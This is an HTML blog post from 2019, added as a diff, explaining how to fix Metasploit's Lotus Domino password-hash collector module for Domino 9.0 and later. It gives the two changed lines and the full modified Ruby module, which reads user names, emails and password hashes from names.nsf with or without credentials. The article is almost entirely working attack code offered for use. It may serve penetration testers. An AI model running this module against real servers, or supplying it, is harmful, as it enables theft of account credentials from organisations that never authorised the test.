@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="mark">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="mark">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>关于metasploit模块lotus版本大于9.0的修改 · Marksec&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Marksec&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">关于metasploit模块lotus版本大于9.0的修改</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Marksec's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            关于metasploit模块lotus版本大于9.0的修改
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="metasploit">metasploit</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/04/04</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote><br>  最近在工作中遇到了lotus的邮件系统，但在对于lotus的研究中发现，在使用metastploit的auxiliary/scanner/lotus/lotus_domino_hashes的时候，出现了报错，在显示了第一行的用户名和密码后，就直接报错了，在查询资料了解到lotus&gt;=9.0，登陆功能发生了变化，无法使用。<br></blockquote>
+
+<p>metasploit的中的lotus用户名密码导出模块auxiliary/scanner/lotus/lotus_domino_hashes的两处修改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一处：       </span><br><span class="line">       res = send_request_raw(&#123;</span><br><span class="line">          &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">         &apos;uri&apos;     =&gt; &quot;#&#123;$uri&#125;\/$defaultview?Readviewentries&quot;,</span><br><span class="line">第二处：</span><br><span class="line">          :source_id =&gt; domino_svc.id,</span><br></pre></td></tr></table></figure>
+<p>修改成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一处：        </span><br><span class="line">        res = send_request_cgi(&#123;</span><br><span class="line">          &apos;uri&apos;     =&gt; &apos;/names.nsf/$defaultview?Readviewentries&apos;,</span><br><span class="line">第二处：</span><br><span class="line">           #:source_id =&gt; domino_svc.id,</span><br></pre></td></tr></table></figure>
+<p>修改完的完整rb脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="line"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">class MetasploitModule &lt; Msf::Auxiliary</span><br><span class="line">  include Msf::Exploit::Remote::HttpClient</span><br><span class="line">  include Msf::Auxiliary::Report</span><br><span class="line">  include Msf::Auxiliary::Scanner</span><br><span class="line"></span><br><span class="line">  def initialize</span><br><span class="line">    super(</span><br><span class="line">      &apos;Name&apos;           =&gt; &apos;Lotus Domino Password Hash Collector&apos;,</span><br><span class="line">      &apos;Description&apos;    =&gt; &apos;Get users passwords hashes from names.nsf page&apos;,</span><br><span class="line">      &apos;Author&apos;         =&gt; &apos;Tiago Ferreira &lt;tiago.ccna[at]gmail.com&gt;&apos;,</span><br><span class="line">      &apos;License&apos;        =&gt; MSF_LICENSE,</span><br><span class="line">      &apos;References&apos;     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [&apos;CVE&apos; , &apos;2007-0977&apos;]</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">  register_options(</span><br><span class="line">    [</span><br><span class="line">      OptString.new(&apos;NOTES_USER&apos;, [false, &apos;The username to authenticate as&apos;, &apos;&apos;]),</span><br><span class="line">      OptString.new(&apos;NOTES_PASS&apos;, [false, &apos;The password for the specified username&apos; ]),</span><br><span class="line">      OptString.new(&apos;URI&apos;, [false, &apos;Define the path to the names.nsf file&apos;, &apos;/names.nsf&apos;])</span><br><span class="line">    ])</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def post_auth?</span><br><span class="line">    true</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def run_host(ip)</span><br><span class="line">    user = datastore[&apos;NOTES_USER&apos;]</span><br><span class="line">    pass = datastore[&apos;NOTES_PASS&apos;]</span><br><span class="line">    @uri = normalize_uri(datastore[&apos;URI&apos;])</span><br><span class="line"></span><br><span class="line">    if user.eql?(&apos;&apos;) &amp;&amp; pass.eql?(&apos;&apos;)</span><br><span class="line">      print_status(&quot;#&#123;peer&#125; - Lotus Domino - Trying dump password hashes without credentials&quot;)</span><br><span class="line"></span><br><span class="line">      begin</span><br><span class="line">        res = send_request_raw(&#123;</span><br><span class="line">          &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">          &apos;uri&apos;     =&gt; &quot;#&#123;@uri&#125;\/$defaultview?Readviewentries&quot;,</span><br><span class="line">        &#125;, 25)</span><br><span class="line"></span><br><span class="line">        if res.nil?</span><br><span class="line">          print_error(&apos;Connection failed&apos;)</span><br><span class="line">          return</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        if res &amp;&amp; res.body.to_s =~ /\&lt;viewentries/</span><br><span class="line">          print_good(&quot;#&#123;peer&#125; - Lotus Domino - OK names.nsf accessible without credentials&quot;)</span><br><span class="line">          cookie = &apos;&apos;</span><br><span class="line">          get_views(cookie, @uri)</span><br><span class="line"></span><br><span class="line">        elsif res &amp;&amp; res.body.to_s =~ /names.nsf\?Login/</span><br><span class="line">          print_error(&quot;#&#123;peer&#125; - Lotus Domino - The remote server requires authentication&quot;)</span><br><span class="line">          return :abort</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line">          print_error(&quot;#&#123;peer&#125; - Lotus Domino - Unrecognized #&#123;res.code&#125; response&quot;)</span><br><span class="line">          vprint_error(res.to_s)</span><br><span class="line">          return :abort</span><br><span class="line"></span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">      rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">      print_status(&quot;#&#123;peer&#125; - Lotus Domino - Trying dump password hashes with given credentials&quot;)</span><br><span class="line">      do_login(user, pass)</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def do_login(user = nil, pass = nil)</span><br><span class="line">    post_data = &quot;username=#&#123;Rex::Text.uri_encode(user.to_s)&#125;&amp;password=#&#123;Rex::Text.uri_encode(pass.to_s)&#125;&amp;RedirectTo=%2Fnames.nsf&quot;</span><br><span class="line"></span><br><span class="line">    begin</span><br><span class="line"></span><br><span class="line">      res = send_request_cgi(&#123;</span><br><span class="line">        &apos;method&apos;  =&gt; &apos;POST&apos;,</span><br><span class="line">        &apos;uri&apos;     =&gt; &apos;/names.nsf?Login&apos;,</span><br><span class="line">        &apos;data&apos;    =&gt; post_data</span><br><span class="line">      &#125;, 20)</span><br><span class="line"></span><br><span class="line">      if res.nil?</span><br><span class="line">        print_error(&quot;#&#123;peer&#125; - Connection timed out&quot;)</span><br><span class="line">        return</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">      if res &amp;&amp; res.code == 302</span><br><span class="line">        if res.get_cookies =~ /DomAuthSessId=(.*);(.*)/i</span><br><span class="line">          cookie = &quot;DomAuthSessId=#&#123;$1&#125;&quot;</span><br><span class="line">        elsif res.get_cookies =~ /LtpaToken=(.*);(.*)/i</span><br><span class="line">          cookie = &quot;LtpaToken=#&#123;$1&#125;&quot;</span><br><span class="line">        else</span><br><span class="line">          print_error(&quot;#&#123;peer&#125; - Lotus Domino - Unrecognized 302 response&quot;)</span><br><span class="line">          return :abort</span><br><span class="line">        end</span><br><span class="line">        print_good(&quot;#&#123;peer&#125; - Lotus Domino - SUCCESSFUL authentication for &apos;#&#123;user&#125;&apos;&quot;)</span><br><span class="line">        print_status(&quot;#&#123;peer&#125; - Lotus Domino - Getting password hashes&quot;)</span><br><span class="line">        get_views(cookie, @uri)</span><br><span class="line"></span><br><span class="line">      elsif res &amp;&amp; res.body.to_s =~ /names.nsf\?Login/</span><br><span class="line">        print_error(&quot;#&#123;peer&#125; - Lotus Domino - Authentication error: failed to login as &apos;#&#123;user&#125;&apos;&quot;)</span><br><span class="line">        return :abort</span><br><span class="line"></span><br><span class="line">      else</span><br><span class="line">        print_error(&quot;#&#123;peer&#125; - Lotus Domino - Unrecognized #&#123;res.code&#125; response&quot;)</span><br><span class="line">        return :abort</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">    rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def get_views(cookie, uri)</span><br><span class="line">    begin</span><br><span class="line">      res = send_request_raw(&#123;</span><br><span class="line">        &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">        &apos;uri&apos;     =&gt; &quot;#&#123;uri&#125;\/$defaultview?Readviewentries&quot;,</span><br><span class="line">        &apos;cookie&apos;  =&gt; cookie</span><br><span class="line">      &#125;, 25)</span><br><span class="line">      if res &amp;&amp; res.body</span><br><span class="line">        max = res.body.scan(/siblings=\&quot;(.*)\&quot;/).first.join</span><br><span class="line"></span><br><span class="line">        1.upto(max.to_i) do |i|</span><br><span class="line">          res = send_request_raw(&#123;</span><br><span class="line">            &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">            &apos;uri&apos;     =&gt; &quot;#&#123;uri&#125;\/$defaultview?Readviewentries&amp;Start=#&#123;i&#125;&quot;,</span><br><span class="line">            &apos;cookie&apos;  =&gt; cookie</span><br><span class="line">          &#125;, 25)</span><br><span class="line"></span><br><span class="line">          view_id = res.body.scan(/unid=&quot;([^\s]+)&quot;/)[0].join</span><br><span class="line">          dump_hashes(view_id, cookie, uri)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">    rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def dump_hashes(view_id, cookie, uri)</span><br><span class="line">    begin</span><br><span class="line">      res = send_request_raw(&#123;</span><br><span class="line">        &apos;method&apos;  =&gt; &apos;GET&apos;,</span><br><span class="line">        &apos;uri&apos;     =&gt; &quot;#&#123;uri&#125;\/$defaultview/#&#123;view_id&#125;?OpenDocument&quot;,</span><br><span class="line">        &apos;cookie&apos;  =&gt; cookie</span><br><span class="line">      &#125;, 25)</span><br><span class="line"></span><br><span class="line">      if res &amp;&amp; res.body</span><br><span class="line">        short_name = res.body.scan(/&lt;INPUT NAME=\&quot;ShortName\&quot; TYPE=(?:.*) VALUE=\&quot;([^\s]+)&quot;/i).join</span><br><span class="line">        user_mail = res.body.scan(/&lt;INPUT NAME=\&quot;InternetAddress\&quot; TYPE=(?:.*) VALUE=\&quot;([^\s]+)&quot;/i).join</span><br><span class="line">        pass_hash = res.body.scan(/&lt;INPUT NAME=\&quot;\$?dspHTTPPassword\&quot; TYPE=(?:.*) VALUE=\&quot;([^\s]+)&quot;/i).join</span><br><span class="line"></span><br><span class="line">        short_name = &apos;NULL&apos; if short_name.to_s.strip.empty?</span><br><span class="line">        user_mail = &apos;NULL&apos; if user_mail.to_s.strip.empty?</span><br><span class="line">        pass_hash = &apos;NULL&apos; if pass_hash.to_s.strip.empty?</span><br><span class="line"></span><br><span class="line">        print_good(&quot;#&#123;peer&#125; - Lotus Domino - Account Found: #&#123;short_name&#125;, #&#123;user_mail&#125;, #&#123;pass_hash&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        if pass_hash != &apos;NULL&apos;</span><br><span class="line">          domino_svc = report_service(</span><br><span class="line">            :host =&gt; rhost,</span><br><span class="line">            :port =&gt; rport,</span><br><span class="line">            :name =&gt; (ssl ? &apos;https&apos; : &apos;http&apos;)</span><br><span class="line">          )</span><br><span class="line">          report_auth_info(</span><br><span class="line">            :host        =&gt; rhost,</span><br><span class="line">            :port        =&gt; rport,</span><br><span class="line">            :sname       =&gt; (ssl ? &apos;https&apos; : &apos;http&apos;),</span><br><span class="line">            :user        =&gt; short_name,</span><br><span class="line">            :pass        =&gt; pass_hash,</span><br><span class="line">            :ptype       =&gt; &apos;domino_hash&apos;,</span><br><span class="line">            :source_id   =&gt; domino_svc.id,</span><br><span class="line">            :source_type =&gt; &apos;service&apos;,</span><br><span class="line">            :proof       =&gt; &quot;WEBAPP=\&quot;Lotus Domino\&quot;, USER_MAIL=#&#123;user_mail&#125;, HASH=#&#123;pass_hash&#125;, VHOST=#&#123;vhost&#125;&quot;,</span><br><span class="line">            :active      =&gt; true</span><br><span class="line">          )</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line"></span><br><span class="line">    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br><span class="line">    rescue ::Timeout::Error, ::Errno::EPIPE</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>将该模块复制进metasploit，出现启动载入模块，即可使用</p>
+<p>参考链接：<a href="https://github.com/rapid7/metasploit-framework/issues/8278" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/issues/8278</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://markhacker.github.io">mark</a>
+            </p><p>原文链接：<a href="https://markhacker.github.io/2019/04/04/lotus模块修改/">https://markhacker.github.io/2019/04/04/lotus模块修改/</a>
+            </p><p>发表日期：<a href="https://markhacker.github.io/2019/04/04/lotus模块修改/">April 4th 2019, 4:13:00 pm</a>
+            </p><p>更新日期：<a href="https://markhacker.github.io/2019/04/04/lotus模块修改/">April 4th 2019, 6:24:36 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/12/06/Empire学习指南/" title="Empire学习指南">
+                    <div class="prevTitle">Empire学习指南</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
